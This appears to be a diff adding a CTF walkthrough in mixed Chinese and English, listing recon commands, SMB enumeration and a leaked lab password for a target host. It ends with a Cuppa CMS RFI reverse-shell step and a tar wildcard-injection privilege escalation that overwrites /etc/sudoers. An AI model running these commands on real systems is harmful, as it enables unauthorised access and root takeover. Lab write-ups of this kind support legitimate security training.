@@ -1,0 +1,28 @@
+nmap 10.10.68.86 -sV -sC -Pn > nmap.txt
+
+gobuster dir  -u http://10.10.68.86/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+
+
+nmap --script smb* -sV -p 139,445 10.10.68.86 > nmapsmb.txt
+
+
+smbclient -N -U guest //10.10.68.86/milesdyson
+smbclient -N -U Miles //10.10.68.86/milesdyson
+
+1.nmap掃描到有samba服務,anonymous可以登入並下載檔案
+2.enum4linux 掃描可發現用戶milesdyson
+enum4linux 10.10.68.86
+3.使用log內的密碼可以成功登入
+4.可以查看到milesdyson的samba密碼
+smbclient //10.10.68.86/milesdyson -U milesdyson                                                                                                                                                                 130 ⨯
+)s{A&2Z=F^n_E.B`
+5.發現有important.txt文件
+6.查看到網頁http://10.10.126.39/45kra24zxs28v3yd/
+gobuster dir  -u http://10.10.126.39/45kra24zxs28v3yd/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobusterhidden.txt
+7.發現administrator是cuppa的服務
+8.cuppa服務可以不登錄情況,有RFI漏洞
+9.訪問本地reverse.php取得reverse shell
+10.
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "/var/www/html"  > --checkpoint=1
